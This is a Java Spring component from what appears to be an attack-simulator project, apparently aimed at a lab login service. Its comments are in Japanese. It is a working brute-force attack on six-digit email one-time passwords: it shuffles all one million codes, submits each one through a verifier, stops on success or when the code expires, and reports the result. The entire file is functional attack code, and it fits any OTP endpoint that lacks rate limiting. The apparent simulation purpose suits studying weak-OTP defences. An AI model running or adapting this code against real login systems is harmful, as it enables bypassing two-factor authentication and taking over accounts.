
package com.example.attacksimulator.attack;

import java.security.SecureRandom;

import org.springframework.stereotype.Component;

import com.example.attacksimulator.client.NewAuthLabLoginClient;
import com.example.attacksimulator.client.NewAuthLabLoginClient.LoginResult;
import com.example.attacksimulator.state.AttackState;

@Component
public class RandomEmailOtpAttack {

	private static final int MIN_OTP = 0;

	private static final int MAX_OTP = 999_999;

	private static final int OTP_COUNT = 1_000_000;

	private final NewAuthLabLoginClient newAuthLabLoginClient;

	private final AttackState attackState;

	private final SecureRandom secureRandom = new SecureRandom();

	public RandomEmailOtpAttack(
			NewAuthLabLoginClient newAuthLabLoginClient,
			AttackState attackState) {

		this.newAuthLabLoginClient = newAuthLabLoginClient;
		this.attackState = attackState;
	}

	// =========================================================
	// Email OTP ランダム攻撃
	// =========================================================
	//
	// 000000 ～ 999999 をランダムな順番で試行
	// 同じOTPは二度試行しない
	//
	// otpVerifier は呼び出し元から渡してもらう
	// LoginResult を返すことで認証結果も保持する
	// =========================================================

	public AttackResult execute(
			OtpVerifier otpVerifier,
			int maxAttempts) {

		maxAttempts = clampAttempts(maxAttempts);

		int attemptCount = 0;

		String otp = null;

		boolean success = false;

		LoginResult loginResult = null;

		// 攻撃開始時にタイムアウト状態をリセット
		attackState.setOtpTimedOut(false);

		// 最初に有効期限を確認
		if (newAuthLabLoginClient.checkOtpExpiration()) {

			attackState.setOtpTimedOut(true);

			boolean timeOut = attackState.isOtpTimedOut();

			System.out.println("!!! TIME UP !!!");

			return new AttackResult(
					false,
					null,
					0,
					timeOut,
					null);
		}

		// OTP候補を作成
		int[] candidates = createCandidates();

		// ランダムにシャッフル
		shuffle(candidates);

		// 1秒ごとに期限を確認する
		long lastExpirationCheck = System.currentTimeMillis();

		for (int candidate : candidates) {

			if (attemptCount >= maxAttempts) {
				break;
			}

			// 1秒経過したら有効期限確認
			long now = System.currentTimeMillis();

			if (now - lastExpirationCheck >= 1000) {

				lastExpirationCheck = now;

				if (newAuthLabLoginClient.checkOtpExpiration()) {

					attackState.setOtpTimedOut(true);

					System.out.println("!!! TIME UP !!!");

					System.out.println(
							"OTPの有効期限切れにより攻撃を停止しました。");

					break;
				}
			}

			// 攻撃試行
			attemptCount++;

			String candidateOtp = String.format("%06d", candidate);

			System.out.println(
					"ランダムOTP 試行 "
							+ attemptCount
							+ " / "
							+ maxAttempts);

			// OTP検証
			LoginResult verifyResult =
					otpVerifier.verify(candidateOtp);

			// 認証結果を保持
			loginResult = verifyResult;

			// 認証成功判定
			if (verifyResult != null && verifyResult.isSuccess()) {

				otp = candidateOtp;

				success = true;

				System.out.println("OTP認証成功！");

				break;
			}
		}

		boolean timeOut = attackState.isOtpTimedOut();

		return new AttackResult(
				success,
				otp,
				attemptCount,
				timeOut,
				loginResult);
	}

	// =========================================================
	// OTP候補作成
	// =========================================================

	private int[] createCandidates() {

		int[] candidates = new int[OTP_COUNT];

		for (int i = MIN_OTP; i <= MAX_OTP; i++) {

			candidates[i] = i;
		}

		return candidates;
	}

	// =========================================================
	// Fisher-Yatesシャッフル
	// =========================================================

	private void shuffle(int[] array) {

		for (int i = array.length - 1; i > 0; i--) {

			int j = secureRandom.nextInt(i + 1);

			int temp = array[i];

			array[i] = array[j];

			array[j] = temp;
		}
	}

	// =========================================================
	// 最大試行回数
	// 1～1000000
	// =========================================================

	private int clampAttempts(int attempts) {

		if (attempts < 1) {
			return 1;
		}

		if (attempts > 1_000_000) {
			return 1_000_000;
		}

		return attempts;
	}

	// =========================================================
	// OTP検証用インターフェース
	// =========================================================

	@FunctionalInterface
	public interface OtpVerifier {

		LoginResult verify(String otp);
	}

	// =========================================================
	// 攻撃結果
	// =========================================================

	public static class AttackResult {

		private final boolean success;

		private final String otp;

		private final int attemptCount;

		private final boolean timeOut;

		private final LoginResult loginResult;

		public AttackResult(
				boolean success,
				String otp,
				int attemptCount,
				boolean timeOut,
				LoginResult loginResult) {

			this.success = success;

			this.otp = otp;

			this.attemptCount = attemptCount;

			this.timeOut = timeOut;

			this.loginResult = loginResult;
		}

		public boolean isSuccess() {
			return success;
		}

		public String getOtp() {
			return otp;
		}

		public int getAttemptCount() {
			return attemptCount;
		}

		public boolean isTimedOut() {
			return timeOut;
		}

		public LoginResult getLoginResult() {
			return loginResult;
		}
	}
}
